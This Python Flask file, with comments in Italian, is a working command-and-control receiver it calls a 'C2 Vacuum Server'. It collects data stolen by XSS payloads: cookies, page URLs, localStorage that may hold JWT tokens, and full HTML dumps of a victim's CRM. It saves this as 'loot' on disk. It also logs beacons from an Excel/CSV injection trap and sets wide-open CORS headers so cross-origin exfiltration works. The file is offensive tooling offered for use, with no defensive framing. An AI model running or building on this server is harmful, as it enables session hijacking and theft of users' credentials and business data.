from flask import Flask, request, json
import base64
from datetime import datetime
import os

app = Flask(__name__)

# Directory per salvare i dump HTML
LOG_DIR = "loot_dumps"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RESET = '\033[0m'

@app.after_request
def add_cors_headers(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type,Authorization'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
    return response

@app.route('/vacuum', methods=['POST', 'OPTIONS'])
def vacuum():
    if request.method == 'OPTIONS':
        return "OK", 200
        
    # Riceve il payload JSON completo
    try:
        loot = request.json
        
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        ip = request.remote_addr
        
        print(f"\n{RED}[!!!] MASSIVE DATA VACUUM SUCCESSFUL AT {timestamp} [!!!]{RESET}")
        print(f"{GREEN}Source IP:{RESET} {ip}")
        print(f"{YELLOW}CRM URL:{RESET} {loot.get('u', 'N/A')}")
        print(f"{YELLOW}Cookies:{RESET} {loot.get('c', 'N/A')}")
        print(f"{YELLOW}User Agent:{RESET} {loot.get('ua', 'N/A')}")
        
        # LocalStorage a volte contiene token JWT
        ls_data = loot.get('ls', '{}')
        if len(ls_data) > 5:
             print(f"{YELLOW}LocalStorage Found!{RESET} (Check dumps)")

        # Salviamo il dump completo (incluso l'HTML del loro CRM) su file
        dump_filename = f"{LOG_DIR}/loot_{timestamp}_{ip}.json"
        with open(dump_filename, "w", encoding='utf-8') as f:
            json.dump(loot, f, indent=4)
            
        print(f"{GREEN}[*] Full dump saved to: {dump_filename}{RESET}")
        print("-" * 60)
        
    except Exception as e:
        print(f"{RED}Error processing vacuum payload: {e}{RESET}")

    return "200 OK"

@app.route('/exfil')
def exfil():
    # Legacy support per i vecchi payload GET
    # Ricezione dati dal payload XSS
    encoded_cookie = request.args.get('c', '')
    encoded_loc = request.args.get('l', '')
    
    try:
        cookie = base64.b64decode(encoded_cookie).decode('utf-8')
        location = base64.b64decode(encoded_loc).decode('utf-8')
        
        print(f"\n{RED}[!!!] LOOT RECEIVED (Legacy GET) AT {datetime.now()} [!!!]{RESET}")
        print(f"{GREEN}Source IP:{RESET} {request.remote_addr}")
        print(f"{GREEN}Location:{RESET} {location}")
        print(f"{GREEN}Cookies :{RESET} {cookie}")
        print("-" * 50)
        
    except Exception as e:
        print(f"Error decoding loot: {e}")

    return "200 OK"

@app.route('/track')
def track():
    # Ricezione trigger da Excel/CSV
    src = request.args.get('src', 'unknown')
    print(f"\n{RED}[!] EXCEL/CSV TRAP TRIGGERED [!]{RESET}")
    print(f"{GREEN}Source:{RESET} {src}")
    print(f"{GREEN}IP:{RESET} {request.remote_addr}")
    return "Err"

# Endpoint leggero per test di connessione
@app.route('/ping')
def ping():
    return "pong"

if __name__ == '__main__':
    # IMPORTANTE: Se usi un IP di rete locale (es. 192.168.x.x), cambialo qui.
    # Per test sullo stesso PC, 127.0.0.1 va bene.
    print(" [*] C2 Vacuum Server running on port 5000...")
    app.run(host='0.0.0.0', port=5000, debug=True)
